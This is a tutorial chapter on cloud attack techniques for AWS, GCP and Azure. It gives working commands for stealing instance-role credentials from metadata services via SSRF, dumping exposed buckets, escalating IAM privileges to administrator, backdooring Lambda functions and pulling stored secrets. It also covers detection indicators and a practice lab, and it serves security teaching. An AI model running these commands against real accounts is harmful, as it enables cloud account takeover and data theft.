---
title: 'Cloud Security'
subtitle: 'AWS, GCP, and Azure attack techniques — IAM misconfigs, S3 exposure, metadata service abuse, container escapes, and cloud-native threats.'
chapter: 17
level: 'advanced'
readingTime: '16 min'
topics:
  [
    'cloud security',
    'AWS',
    'GCP',
    'Azure',
    'IAM',
    'S3',
    'metadata service',
    'cloud hacking',
    'cloud pentesting'
  ]
---

<script>
	import Callout from '$lib/components/content/Callout.svelte';
</script>

<Callout type="info">

**Real-World Analogy**

The cloud is not "someone else's computer" — it's your computer with a thousand configuration options, each one a potential door left open. The shared responsibility model means AWS secures the hardware; you secure everything built on top of it.

</Callout>

## Cloud Attack Surface

```
External (internet-facing):
  - S3 buckets with public access
  - Exposed EC2 instances (misconfigured security groups)
  - Public RDS databases
  - Lambda function URLs without auth
  - API Gateway without auth
  - Storage account public blobs (Azure)
  - GCS buckets with allUsers access

Internal (after initial access):
  - IMDS (Instance Metadata Service) — 169.254.169.254
  - Over-privileged IAM roles on EC2
  - Secrets in environment variables / SSM Parameter Store
  - Cross-account trust relationships
  - Misconfigured resource policies
```

## AWS Enumeration

```bash
# Install AWS CLI
pip install awscli

# If you found AWS keys (from GitHub recon, .env files, etc.)
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Identify who you are
aws sts get-caller-identity
# Returns: Account, UserId, ARN (tells you the role/user name)

# List permissions (what can this key do?)
# No direct API, but try common calls:
aws iam get-account-summary
aws iam list-users
aws iam list-roles
aws iam get-user

# Enumerate S3
aws s3 ls                                    # list buckets you own
aws s3 ls s3://target-bucket                # list bucket contents
aws s3 cp s3://target-bucket/secret.txt .   # download file
aws s3 sync s3://target-bucket /tmp/dump/   # download everything

# Enumerate EC2
aws ec2 describe-instances --output table
aws ec2 describe-security-groups

# Enumerate IAM
aws iam list-attached-user-policies --user-name alice
aws iam list-user-policies --user-name alice
aws iam get-policy-version --policy-arn arn:aws:iam::123456789:policy/MyPolicy --version-id v1
```

## S3 Bucket Attacks

S3 bucket misconfigurations are the most common cloud security finding.

```bash
# Check public bucket access (no credentials)
aws s3 ls s3://target-bucket --no-sign-request
aws s3 cp s3://target-bucket/secret.txt . --no-sign-request

# Brute force bucket names (company-related names)
# Tools: S3Scanner, BucketFinder
python3 s3scanner.py --bucket-file wordlist.txt --dump

# Common naming patterns to try:
# company-backup, company-logs, company-dev, company-prod
# company-files, company-assets, company-internal
# companyname-db-backup, companyname-customer-data

# Check for:
# 1. ListBucket — see all files
# 2. GetObject — download files
# 3. PutObject — upload files (can host phishing pages, malware)

# Test with AWS CLI:
aws s3api list-objects --bucket target-bucket --no-sign-request
aws s3api get-object --bucket target-bucket --key path/to/file /tmp/file --no-sign-request

# Upload test (if write access)
echo "test" > test.txt
aws s3 cp test.txt s3://target-bucket/test.txt --no-sign-request
```

## EC2 Metadata Service (IMDS) Abuse

The most critical technique for cloud privilege escalation. From any RCE/SSRF on an EC2 instance:

```bash
# IMDSv1 — no token required (dangerous)
curl http://169.254.169.254/latest/meta-data/

# Navigate the API tree:
curl http://169.254.169.254/latest/meta-data/hostname
curl http://169.254.169.254/latest/meta-data/iam/
curl http://169.254.169.254/latest/meta-data/iam/info
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns: role name (e.g., "EC2WebRole")

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2WebRole
# Returns JSON with temporary credentials:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "2024-01-01T12:00:00Z"
# }

# Use credentials on attacker machine
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

aws sts get-caller-identity  # verify identity
aws s3 ls                     # now using EC2's IAM role
```

**Why this matters:** EC2 instances often have roles like `FullS3Access` or `AdminRole` attached. SSRF vulnerability + IMDS = cloud account takeover.

**Defense:** IMDSv2 requires a PUT request first (token-based) — prevents SSRF from reaching it because SSRF can't follow the two-step flow.

## SSRF → Cloud Metadata

```bash
# In a web app SSRF parameter:
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# If the app reflects the response, you get AWS credentials
# Common SSRF targets:
# AWS:   http://169.254.169.254/latest/meta-data/
# GCP:   http://metadata.google.internal/computeMetadata/v1/
# Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01

# GCP metadata (requires Metadata-Flavor: Google header)
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
```

## AWS Privilege Escalation

```bash
# If you have iam:CreatePolicyVersion — create a new version with AdministratorAccess
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789:policy/MyPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# If you have iam:AttachUserPolicy — attach AdministratorAccess to yourself
aws iam attach-user-policy \
  --user-name alice \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# If you have iam:CreateAccessKey — create new key for another user
aws iam create-access-key --user-name admin

# If you have sts:AssumeRole — assume a more privileged role
aws sts assume-role \
  --role-arn arn:aws:iam::123456789:role/AdminRole \
  --role-session-name attack

# If you have lambda:UpdateFunctionCode — backdoor a Lambda function
aws lambda update-function-code \
  --function-name target-function \
  --zip-file fileb://malicious.zip

# Automated: Pacu — AWS exploitation framework
git clone https://github.com/RhinoSecurityLabs/pacu
python3 pacu.py
# run modules: iam__privesc_scan, ec2__enum, s3__bucket_finder
```

## GCP Attack Techniques

```bash
# Authenticate with stolen token
gcloud auth activate-service-account --key-file stolen_key.json

# Enumerate
gcloud projects list
gcloud compute instances list
gcloud storage buckets list
gcloud iam service-accounts list

# Check your permissions
gcloud projects get-iam-policy PROJECT_ID

# GCS bucket public access
gsutil ls gs://target-bucket
gsutil cp gs://target-bucket/secret.txt .

# Metadata endpoint (from GCE instance)
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Get service account email
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
  -H "Metadata-Flavor: Google"

# Access all scopes
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" \
  -H "Metadata-Flavor: Google"
```

## Azure Attack Techniques

```bash
# Install Azure CLI
az login --service-principal -u APP_ID -p PASSWORD --tenant TENANT_ID

# Enumerate
az account list
az vm list --output table
az storage account list
az ad user list
az role assignment list --all

# Check current permissions
az account get-access-token

# Storage account blob access
az storage blob list --account-name targetaccount --container-name files
az storage blob download --account-name targetaccount --container-name files --name secret.txt

# Azure metadata (from Azure VM)
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"
# Returns: access_token for Azure management API

# AzureHound — like BloodHound for Azure
./AzureHound -u user@company.com -p 'Password1' --tenant TENANT_ID -o azurehound.json
# Import into BloodHound for attack path analysis
```

## Cloud Security Tools

```bash
# ScoutSuite — multi-cloud security auditing
pip install scoutsuite
python3 scout.py aws --profile default
# Generates HTML report with all misconfigurations

# Prowler — AWS security best practices
pip install prowler
prowler aws --output-formats html csv
# 200+ checks covering CIS benchmarks, OWASP, MITRE ATT&CK

# CloudSploit — automated cloud security scanning
npm install -g cloudsploit
cloudsploit scan --cloud aws --config config.js

# Enumerate cloud environments from found credentials
# CloudEnum
python3 cloud_enum.py -k targetcompany

# TruffleHog — find secrets in cloud storage
trufflehog s3 --bucket target-bucket
```

## Secrets in Cloud Environments

```bash
# AWS Systems Manager Parameter Store
aws ssm describe-parameters
aws ssm get-parameter --name "/prod/db/password" --with-decryption

# AWS Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id prod/database

# AWS Lambda environment variables
aws lambda get-function-configuration --function-name my-function | jq '.Environment'

# EC2 user data (startup scripts often contain credentials)
curl http://169.254.169.254/latest/user-data

# Kubernetes secrets (if EKS)
kubectl get secrets --all-namespaces
kubectl get secret db-secret -o jsonpath='{.data.password}' | base64 -d

# GitHub Actions secrets leaked in logs (search CI logs)
# .github/workflows often contain cloud credentials patterns
```

## Cloud Incident Response Indicators

```bash
# CloudTrail — AWS audit log (what API calls were made, when, from where)
aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=alice

# Signs of compromise in CloudTrail:
# - CreateAccessKey for IAM users
# - GetSecretValue calls from unexpected IPs
# - Large S3 GetObject requests (exfiltration)
# - AssumeRole from unfamiliar accounts
# - ConsoleLogin from foreign countries
# - AttachRolePolicy / CreatePolicyVersion

# GuardDuty finding types to watch:
# UnauthorizedAccess:IAMUser/MaliciousIPCaller
# CredentialAccess:Kubernetes/MaliciousIPCaller
# Exfiltration:S3/AnomalousBehavior
```

## Real Project: CloudGoat

CloudGoat is Rhino Security's vulnerable-by-design AWS infrastructure:

```bash
git clone https://github.com/RhinoSecurityLabs/cloudgoat
cd cloudgoat
pip install -r requirements.txt
python3 cloudgoat.py config profile default

# Create a scenario
python3 cloudgoat.py create vulnerable_lambda

# Scenarios include:
# - iam_privesc_by_rollback
# - cloud_breach_s3
# - ec2_ssrf
# - ecs_ecs_attack
# - lambda_privesc

# Each scenario provides starting credentials and a walkthrough
```
